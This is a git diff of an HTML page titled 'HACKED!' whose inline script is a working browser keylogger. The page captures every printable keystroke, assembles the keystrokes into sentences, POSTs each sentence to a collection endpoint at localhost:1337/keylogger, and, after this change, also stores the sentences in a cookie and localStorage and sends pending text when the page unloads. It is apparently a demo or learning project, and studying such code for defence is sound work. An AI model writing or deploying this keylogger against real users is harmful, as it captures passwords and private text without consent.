@@ -7,47 +7,50 @@
     <title>HACKED!</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script>
-        const endOfSentence = ['.', '!', '?']
-        var keys = [];
+        const endOfSentence = ['.', '!', '?'];
+        var chars = [];
         var words = [];
-        $(document).on('keydown', e => {
+        document.addEventListener('keydown', e => {
             if (!isKeyImportant(e.keyCode))
                 return;
-            let key = e.originalEvent.key;
-            keys.push(key);
-            if (key === ' ') {
+            let char = e.key;
+            chars.push(char);
+            if (char === ' ') {
                 finishedWord();
             }
-            if (endOfSentence.indexOf(key) != -1) {
-                finishedWord();
+            if (endOfSentence.indexOf(char) != -1) {
                 finishedSentence();
             }
-        })
+        });
+        //submit before unload
+        window.onbeforeunload = finishedSentence;
         function finishedWord() {
-            let word = keys.join('');
+            let word = chars.join('');
             console.log("FINISHED WORD!", word);
             words.push(word);
-            keys.length = 0;
+            chars.length = 0;
         }
         function finishedSentence() {
+            finishedWord();
             var sentence = words.join('');
             words.length = 0;
             console.log("FINISHED SENTENCE!", sentence);
             sendData(sentence);
+            addSentenceToCookie(sentence);
+            addSentenceToLocalStorage(sentence);
         }
         function sendData(sentence) {
-            $.ajax({
-                url: 'http://localhost:1337/keylogger',
+            fetch('http://localhost:1337/keylogger', {
                 method: 'POST',
-                data: {
-                    sentence
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                success: () => {
-                    console.log("Successfully sent");
-                }
-            })
+                body: JSON.stringify({
+                    sentence
+                })
+            });
         }
         function isKeyImportant(keyCode) {
             return (keyCode > 47 && keyCode < 58) || // number keys
@@ -57,6 +60,35 @@
                 (keyCode > 185 && keyCode < 193) || // ;=,-./` (in order)
                 (keyCode > 218 && keyCode < 223);   // [\]' (in order)
         }
+
+        const cookieName = 'keyLogger';
+        function addSentenceToCookie(sentence) {
+            var cookie = getCookie(cookieName);
+            var data = []
+            if (cookie) {
+                data = JSON.parse(cookie);
+            }
+            data.push(sentence);
+            document.cookie = cookieName + '=' + JSON.stringify(data);
+        }
+        
+        const localStorageName = cookieName;
+        function addSentenceToLocalStorage(sentence){
+            var stored = localStorage.getItem(localStorageName);
+            var data = []
+            if (stored) {
+                data = JSON.parse(stored);
+            }
+            data.push(sentence);
+            localStorage.setItem(localStorageName, JSON.stringify(data));
+        }
+
+        function getCookie(name) {
+            var value = "; " + document.cookie;
+            var parts = value.split("; " + name + "=");
+            if (parts.length == 2) return parts.pop().split(";").shift();
+        }
+
     </script>
 </head>
 
